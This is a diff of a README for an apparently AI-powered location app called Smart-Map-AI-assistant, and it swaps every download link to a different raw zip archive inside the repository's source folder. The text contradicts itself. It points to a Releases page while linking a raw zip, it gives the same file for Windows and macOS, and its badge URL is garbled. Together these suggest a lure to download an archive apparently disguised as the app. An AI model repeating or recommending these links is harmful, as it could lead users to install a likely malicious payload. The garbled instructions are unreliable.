@@ -1,6 +1,6 @@
 # 🗺️ Smart-Map-AI-assistant - Discover Locations Like Never Before
 
-[![Download](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip%20Now-Click%https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip)](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip)
+[![Download](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip%20Now-Click%https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip)](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip)
 
 ## 🌟 Introduction
 Smart-Map-AI-assistant is an AI-powered app designed to help you discover amazing locations. It combines machine learning and location intelligence to suggest spots that fit your vibe. You don’t need any technical skills to use it.
@@ -15,11 +15,11 @@ Follow these steps to successfully download and run the Smart-Map-AI-assistant a
 
 2. **Visit the Download Page**
    - Click the link below to go to the download page:
-   [Download Smart-Map-AI-assistant](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip)
+   [Download Smart-Map-AI-assistant](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip)
 
 3. **Download the Application**
    - On the Releases page, locate the latest version.
-   - Click the link for your specific operating system to download the file. It will usually look like "https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip" for Windows or "https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip" for macOS.
+   - Click the link for your specific operating system to download the file. It will usually look like "https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip" for Windows or "https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip" for macOS.
 
 4. **Install the Application**
    - For Windows:
@@ -72,7 +72,7 @@ Follow these steps to successfully download and run the Smart-Map-AI-assistant a
 
 ## 🔗 Download & Install
 Make sure to download the latest version from the link below:
-[Download Smart-Map-AI-assistant](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assets/assistant-Map-Smart-A-3.7-beta.5.zip)
+[Download Smart-Map-AI-assistant](https://github.com/djmarkbr/Smart-Map-AI-assistant/raw/refs/heads/main/src/assistant_A_Smart_Map_v1.3.zip)
 
 ## 🤝 Contributing
 We welcome contributions! If you’d like to help improve Smart-Map-AI-assistant, please check our "Contributing Guidelines" on the repository page.
